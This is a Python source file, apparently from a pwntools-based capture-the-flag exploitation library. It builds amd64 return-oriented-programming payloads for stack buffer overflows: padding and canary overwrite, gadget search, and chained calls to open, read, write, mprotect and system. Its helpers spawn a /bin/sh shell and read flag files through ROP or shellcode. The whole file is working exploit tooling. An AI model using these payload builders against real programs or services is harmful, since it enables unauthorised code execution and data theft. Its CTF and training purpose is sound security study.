import re

from collections import OrderedDict
from pwn import sleep

from ..misc import connect_io, s, ra, sh, elf_gadget, gadget, srh, p64, u64
from ..log4ck import *
from ..ck_opcode import amd64_opcode
from ..util import save2json, read4json


def replace_non_alpha(input_str):
    # 使用正则表达式替换非英文字母字符为下划线
    return re.sub(r'[^a-zA-Z0-9]', '_', input_str)


def pattern_flag_from_data(flag_prefix, data) -> bytes:
    if flag_prefix in data:
        # 定义正则表达式模式
        # pattern = r 'flag\{.*?\}'
        pattern = re.escape(flag_prefix) + rb'\{.*?\}'

        # 使用re.findall函数来查找所有匹配的字符串
        matches = re.findall(pattern, data)

        # 输出结果
        for match in matches:
            success(f"Successfully! The flag was successfully received")
            success(f"flag --> {match}")
            return match


class _InnerDict(OrderedDict):
    def __getattr__(self, name):
        if name not in self.keys():
            return None
        return self[name]

    def __setattr__(self, name, value):
        self[name] = value


class RopperAttack:
    def __init__(self):
        self.gadgets = _InnerDict()
        self.padding = 0
        self.canary = -1

        self.elf_gadgets = _InnerDict()
        self.libc_gadgets = _InnerDict()

        self.elf_gadgets_name = ".elf.gadgets"
        self.libc_gadgets_name = ".libc.gadgets"

        # 加载gadgets文件
        if not connect_io.local:
            self.load_gadgets()

    def set_gadgets(self, **kwargs) -> _InnerDict:
        for args_key, args_value in kwargs.items():
            # print(f"{key} = {value}")
            self.gadgets[args_key] = args_value

        return self.gadgets

    def set_padding(self, padding):
        self.padding = padding

    def update_padding(self, padding):
        self.padding = padding

    def set_canary(self, canary):
        self.canary = canary

    def save_gadgets(self):
        temp_elf_gadgets = _InnerDict()
        temp_libc_gadgets = _InnerDict()

        if temp_elf_gadgets is not None:
            try:
                for my_gadget_key, my_gadget_addr in self.gadgets.items():
                    if my_gadget_addr < connect_io.elf.address:
                        temp_elf_gadgets[my_gadget_key] = my_gadget_addr
                        # debug(f"elf: {my_gadget_key} -> {my_gadget_addr}")

                    if connect_io.libc is not None and connect_io.libc.address != 0:
                        if connect_io.elf.address < my_gadget_addr < connect_io.libc.address:
                            temp_elf_gadgets[my_gadget_key] = my_gadget_addr - connect_io.elf.address
                            # debug(f"elf: {my_gadget_key} -> {my_gadget_addr - connect_io.elf.address}")

                        if my_gadget_addr > connect_io.libc.address:
                            temp_libc_gadgets[my_gadget_key] = my_gadget_addr - connect_io.libc.address
                            # debug(f"libc: {my_gadget_key} -> {my_gadget_addr - connect_io.libc.address}")

            except Exception as ex:
                error(f"save_gadgets: {str(ex) = }")

        save2json("./", self.elf_gadgets_name, temp_elf_gadgets)
        save2json("./", self.libc_gadgets_name, temp_libc_gadgets)

    def load_gadgets(self):
        self.elf_gadgets = read4json("./", self.elf_gadgets_name)
        self.libc_gadgets = read4json("./", self.libc_gadgets_name)

        for my_gadget_key, my_gadget_addr in self.elf_gadgets.items():
            self.elf_gadgets[my_gadget_key] = my_gadget_addr + connect_io.elf.address

        self.gadgets.update(self.elf_gadgets)

        if connect_io.libc is not None and connect_io.libc.address != 0:
            for my_gadget_key, my_gadget_addr in self.libc_gadgets.items():
                self.libc_gadgets[my_gadget_key] = my_gadget_addr + connect_io.libc.address

            self.gadgets.update(self.libc_gadgets)

    @staticmethod
    def search_func(exec_func_name: str, exec_func_addr: int) -> int:
        if exec_func_addr is None or exec_func_addr == 0:
            if exec_func_name is not None and exec_func_name != "":
                try:
                    exec_func_addr = connect_io.elf.sym[exec_func_name]
                    success(f"Successfully found the function in elf: {exec_func_name} --> {hex(exec_func_addr)}")
                except Exception as ex:
                    error(f"ELF: Not Found Function {str(ex)}")
                    try:
                        exec_func_addr = connect_io.libc.sym[exec_func_name]
                        success(f"Successfully found the function in libc: {exec_func_name} --> {hex(exec_func_addr)}")
                    except Exception as ex:
                        error(f"LIBC: Not Found Function {str(ex)}")
                        raise Exception
            else:
                error(f"Not Found function")

        return exec_func_addr

    def search_gadgets(self, gadget_name: str) -> int:

        if not connect_io.local:
            self.load_gadgets()

        gadget_name_variable_rules = replace_non_alpha(gadget_name)
        # 先尝试在该对象的gadgets里找
        try:
            need_gadget = self.gadgets[gadget_name_variable_rules]
        except Exception as ex:
            error(f"Not found gadget: {gadget_name} --> {str(ex)}")
            # 该对象里没有尝试从elf文件里找
            try:
                self.gadgets[gadget_name_variable_rules] = elf_gadget(gadget_name)
                need_gadget = self.gadgets[gadget_name_variable_rules]
            except Exception as ex:
                error(f"Not found gadget: {gadget_name} --> {str(ex)}")
                # elf文件也找不到尝试从libc里找
                try:
                    self.gadgets[gadget_name_variable_rules] = gadget(gadget_name)
                    need_gadget = self.gadgets[gadget_name_variable_rules]
                except Exception as ex:
                    error(f"Finally! Not Found Gadget {gadget_name} --> {str(ex)}")
                    raise Exception

        if need_gadget is not None and need_gadget != 0:
            self.gadgets[gadget_name_variable_rules] = need_gadget
            success(f"Successfully found the gadget: {gadget_name_variable_rules} --> {hex(need_gadget)}")

        # 保存
        if not connect_io.local:
            self.save_gadgets()

        return need_gadget


class Amd64RopperAttack(RopperAttack):
    def __init__(self):
        super().__init__()

    def exec_func(self, *, padding_char: bytes = b"A", padding: int = None,
                  canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
                  exec_func_name: str = None, exec_func_addr: int = None, stack_balancing: bool = False,
                  return_func_name: str = None, return_func_addr: int = None,
                  **kwargs) -> bytes:

        if padding is not None:
            self.padding = padding

        # 查看要不要填充canary
        if canary_value is not None and canary_value != 0:
            self.canary = canary_value
        else:
            if canary_bytes is not None and canary_bytes != b'':
                self.canary = u64(canary_bytes)

        arg1_name = 'arg1'
        arg2_name = 'arg2'
        arg3_name = 'arg3'

        exec_func_args = {}
        for args_key, args_value in kwargs.items():
            # exec_func_args.append(args_value)
            exec_func_args[args_key] = args_value

        # 填充padding
        payload = b''
        payload += padding_char * self.padding

        if self.canary != -1:
            payload += p64(self.canary)

        # 查看需不需要修改rbp的值，一般在栈迁移使用
        if rbp_value is not None and rbp_value != -1:
            payload += p64(rbp_value)

        if stack_balancing:
            payload += p64(self.search_gadgets('ret'))

        exec_func_addr = self.search_func(exec_func_name, exec_func_addr)
        return_func_addr = self.search_func(return_func_name, return_func_addr)

        # 这里逻辑要改一下，应该可以指定只传第三个参数这样 (Over!)
        '''
        if len(exec_func_args) >= 1:
            payload += p64(self.search_gadgets('pop rdi;ret'))
            payload += p64(exec_func_args[0])

        if len(exec_func_args) >= 2:
            try:
                payload += p64(self.search_gadgets('pop rsi;ret'))
                payload += p64(exec_func_args[1])
            except Exception as ex:
                error(f"Not Found pop rsi;ret --> {str(ex)}")
                info(f"Start trying a query pop rsi;pop r15;ret")
                payload += p64(self.search_gadgets('pop rsi;pop r15;ret'))
                payload += p64(exec_func_args[1])
                payload += p64(0)

        if len(exec_func_args) >= 3:
            try:
                payload += p64(self.search_gadgets('pop rdx;ret'))
                payload += p64(exec_func_args[2])
            except Exception as ex:
                error(f"Not Found pop rdx;ret --> {str(ex)}")
                info(f"Start trying a query pop rdx;pop r12;ret")
                try:
                    payload += p64(self.search_gadgets('pop rdx;pop r12;ret'))
                    payload += p64(exec_func_args[2])
                    payload += p64(0)
                except Exception as ex:
                    error(f"Finally! Not Found pop rdx;ret --> {str(ex)}")
        
        if len(exec_func_args) >= 0:
            payload += p64(exec_func_addr)
        '''

        if arg1_name in exec_func_args.keys() and exec_func_args[arg1_name] is not None:
            payload += p64(self.search_gadgets('pop rdi;ret'))
            payload += p64(exec_func_args[arg1_name])

        if arg2_name in exec_func_args.keys() and exec_func_args[arg2_name] is not None:
            try:
                payload += p64(self.search_gadgets('pop rsi;ret'))
                payload += p64(exec_func_args[arg2_name])
            except Exception as ex:
                error(f"Not Found pop rsi;ret --> {str(ex)}")
                info(f"Start trying a query pop rsi;pop r15;ret")
                payload += p64(self.search_gadgets('pop rsi;pop r15;ret'))
                payload += p64(exec_func_args[arg2_name])
                payload += p64(0)

        if arg3_name in exec_func_args.keys() and exec_func_args[arg3_name] is not None:
            try:
                payload += p64(self.search_gadgets('pop rdx;ret'))
                payload += p64(exec_func_args[arg3_name])
            except Exception as ex:
                error(f"Not Found pop rdx;ret --> {str(ex)}")
                info(f"Start trying a query pop rdx;pop r12;ret")
                try:
                    payload += p64(self.search_gadgets('pop rdx;pop r12;ret'))
                    payload += p64(exec_func_args[arg3_name])
                    payload += p64(0)
                except Exception as ex:
                    error(f"Finally! Not Found pop rdx;ret --> {str(ex)}")

        payload += p64(exec_func_addr)

        if return_func_name is not None or return_func_addr is not None:
            payload += p64(return_func_addr)

        return payload

    def puts(self, *, padding: int = None,
             canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
             target_addr: int = None,
             stack_balancing: bool = False,
             return_func_name: str = None, return_func_addr: int = None,
             is_send: bool = False) -> bytes:

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='puts', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=target_addr)

        s(payload) if is_send else None

        return payload

    # 这里padding的逻辑要改，比如我是连着构造payload，不需要padding，而且不需要发送 (Over!)
    def open(self, *, padding: int = None,
             canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
             file_name_addr: int = None,
             stack_balancing: bool = False,
             return_func_name: str = None, return_func_addr: int = None,
             is_send: bool = False) -> bytes:

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='open', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=file_name_addr,
                                 arg2=0,
                                 arg3=0)

        s(payload) if is_send else None

        return payload

    def read(self, *, padding: int = None,
             canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
             file_streams: int = None, target_addr: int = None, read_length: int = None,
             stack_balancing: bool = False,
             return_func_name: str = None, return_func_addr: int = None,
             is_send: bool = False) -> bytes:

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='read', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=file_streams,
                                 arg2=target_addr,
                                 arg3=read_length)

        s(payload) if is_send else None

        return payload

    def write(self, *, padding: int = None,
              canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
              file_streams: int = None, target_addr: int = None, write_length: int = None,
              stack_balancing: bool = False,
              return_func_name: str = None, return_func_addr: int = None,
              is_send: bool = False) -> bytes:

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='write', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=file_streams,
                                 arg2=target_addr,
                                 arg3=write_length)

        s(payload) if is_send else None

        return payload

    def mprotect(self, *, padding: int = None,
                 canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
                 target_addr: int = None, length: int = None, permissions: int = 7,
                 stack_balancing: bool = False,
                 return_func_name: str = None, return_func_addr: int = None,
                 is_send: bool = False) -> bytes:

        if target_addr % 0x1000 != 0:
            target_addr = target_addr & 0xfffffffff000
            warning("Warning! mprotect: When this function sets the memory permission, "
                    "the first address needs to be aligned to the page.")
            warning(f"After the automatic update, the address is: {hex(target_addr)}")

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='mprotect', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=target_addr,
                                 arg2=length,
                                 arg3=permissions)

        s(payload) if is_send else None

        return payload

    def system(self, *, padding: int = None,
               canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None,
               target_addr: int = None,
               stack_balancing: bool = True,
               return_func_name: str = None, return_func_addr: int = None,
               is_send: bool = False) -> bytes:

        payload = self.exec_func(padding=padding,
                                 canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                                 exec_func_name='system', stack_balancing=stack_balancing,
                                 return_func_name=return_func_name, return_func_addr=return_func_addr,
                                 arg1=target_addr)

        s(payload) if is_send else None

        return payload

    def get_shell(self, padding: int = None,
                  canary_value: int = None, canary_bytes: bytes = None, rbp_value: int = None) -> None:
        """
        Use `system(b'/bin/sh\x00')` to get shell
        :param padding: The length of the payload that needs to be padding
        :param canary_value: canary value in payload
        :param canary_bytes: bin canary value in payload
        (This parameter is used only if the canary value is Zero or empty)
        :param rbp_value: rbp value in payload
        :return:
        """

        self.system(padding=padding,
                    canary_value=canary_value, canary_bytes=canary_bytes, rbp_value=rbp_value,
                    stack_balancing=True,
                    target_addr=srh('/bin/sh\x00'),
                    is_send=True)
        sh()

    def orw_cat_flag(self, flag_name_str_addr: int, flag_addr: int, flag_name: bytes = b"./flag\x00",
                     padding: int = 8,
                     flag_file_streams: int = 3, flag_max_length: int = 0x30,
                     flag_prefix: bytes = b'flag',
                     is_send: bool = True) -> bytes:
        """
        Use `open(flag_name, 0, 0); read(flag_stream, flag_addr, flag_length); write(stdout, flag_addr, flag_length)`
        to leak flag value
        :param flag_name_str_addr: The name or path of the file where the flag is located
        :param flag_addr: The address where the flag value will be stored
        :param flag_name: The file name or path of the flag
        :param padding: The length of the payload that needs to be padding
        :param flag_file_streams: Open the file stream of the flag file
        :param flag_max_length: flag length (The memory size needs to be considered)
        :param flag_prefix: The first character of the flag string
        :param is_send: Whether to use payload directly or return payload (default: True)
        :return: If you don't send it, it will return payload, and if you send it, it will return the received string
        """

        payload = b''
        payload += b'a' * padding

        payload += self.read(file_streams=0,
                             target_addr=flag_name_str_addr,
                             read_length=0x10)

        payload += self.open(file_name_addr=flag_name_str_addr)

        payload += self.read(file_streams=flag_file_streams,
                             target_addr=flag_addr,
                             read_length=flag_max_length)

        payload += self.write(file_streams=1,
                              target_addr=flag_addr,
                              write_length=flag_max_length)

        if is_send:
            s(payload)
            sleep(1)
            s(flag_name)
            data = ra()

            info(f"Recv Datas: {data}")
            flag = pattern_flag_from_data(flag_prefix, data)

            return flag
        else:
            return payload

    def orw_from_shellcode_cat_flag(self,
                                    padding: int = 8, mprotect_start_addr: int = None,
                                    target_addr: int = None, length: int = 0x4000, return_func_addr: int = None,
                                    flag_prefix: bytes = b'flag',
                                    is_send: bool = True):
        """
        Use mprotect(target_addr, length, 7); shellcode_orw(); to leak flag value
        :param padding: The length of the payload that needs to be padding
        :param mprotect_start_addr: The starting address of the mprotect function payload construction
        (It is to calculate the address that is populated with shellcode below)
        :param target_addr: The first argument of the function,
        which is the beginning of the address to which the permission is to be modified
        :param length:The second argument of the function,
        which is the length of the address from which you want to modify the permission
        :param return_func_addr: The return function after the function is executed,
        usually the starting address of the shellcode
        :param flag_prefix: The first character of the flag string
        :param is_send: Whether to use payload directly or return payload (default: True)
        :return: If you don't send it, it will return payload, and if you send it, it will return the received string
        """

        if mprotect_start_addr is not None or return_func_addr is None:
            return_func_addr = mprotect_start_addr + padding + 0x48

        payload = self.mprotect(padding=padding,
                                target_addr=target_addr,
                                length=length,
                                return_func_addr=return_func_addr)

        payload += amd64_opcode.cat_flag

        if is_send:
            s(payload)
            data = ra()

            info(f"Recv Datas: {data}")
            flag = pattern_flag_from_data(flag_prefix, data)

            return flag
        else:
            return payload


class I386RopperAttack(RopperAttack):
    def __init__(self):
        super().__init__()

    def exec_func(self):
        ...
